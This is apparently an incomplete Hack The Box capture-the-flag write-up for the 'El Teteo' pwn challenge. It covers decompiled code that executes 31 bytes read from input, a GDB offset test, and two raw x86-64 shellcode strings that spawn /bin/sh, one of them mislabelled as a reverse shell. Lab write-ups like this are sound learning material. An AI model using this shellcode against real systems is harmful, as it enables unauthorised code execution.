# ElTeteo

## FLAG: HTB{}

## Status: Incomplete

+ DOCKER: Yes
+ DOWNLOADABLE: Yes

Description: El Teteo, a mischievous ghostly djinni born with a party spirit. You have one chance to summon it and make your wish—but only if it’s in the mood to grant it.

## NOTES

1. Deploy docker
   1. IP:94.237.56.31
   2. PORT:55106
2. Unzip challenge files
   1. > unzip pwn_el_teteo.zip
3. RUN
   1. Lets connect to this just to see what we are working with
      1. > nc 94.237.56.31 55106
         1. "[!] I will do whatever you want, nice or naughty.."
            1. > Nice
               1. No response
            2. > Naughty
               1. No resposne
4. GHIDRA
   1. Lets open this in ghidra and take a look at the code to see if we can see where the vulnerability is at?
   2. Functions
      1. MAIN()

        ```c
            undefined8 main(void)

            {
            **I REMOVED ALL THE VARIABLES THAT CREATED THE BANNER**
            ...
            ...
            ...
            printf(&DAT_00102058,local_a8[iVar32 % 6],puVar31,puVar30,puVar29,puVar28,puVar27,puVar26,puVar25,
                    puVar24,puVar23,puVar22,puVar21,puVar20,puVar19,puVar18,puVar17,puVar16,puVar15,puVar14,
                    puVar13,puVar12,puVar11,puVar10,puVar9,puVar8,puVar7,puVar6,puVar5,puVar4,puVar3,puVar2,
                    puVar1);
            printstr("[!] I will do whatever you want, nice or naughty..\n\n> ");
            local_68 = 0;
            local_60 = 0;
            local_58 = 0;
            local_50 = 0;
            read(0,&local_68,0x1f);
            (*(code *)&local_68)();
            if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                                /* WARNING: Subroutine does not return */
                __stack_chk_fail();
            }
            return 0;
            }
        ```

        1. Sooo one of the main things I see is:
           1. read(0,&local_68,0x1f);
              1. This tells me that we are reading in local_68 and 31 bytes of data since 0x1f = 31 in decimal
5. GDB & GEF
   1. Lets open the binary in GDB
      1. > gdb ./el_teteo
      2. > pattern create 128
         1. aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa
      3. > run
         1. Undefined command: "aeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa".
         2. So we can tell by the difference in characters that only "aaaaaaaabaaaaaaacaaaaaaadaaaaaa" was taken
            1. The first part is 31 -> which is reassuring because that is the value of 0x1f we saw earlier
6. PAYLOAD
   1. So we only have 31 bytes
   2. The Revshell is 27 bytes
   3. That leaves us 4 bytes
   4. So lets craft our payload with 4 A's and then our revshell
      1. "AAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


TOTAL = 31 
/bin/sh = 7 bytes


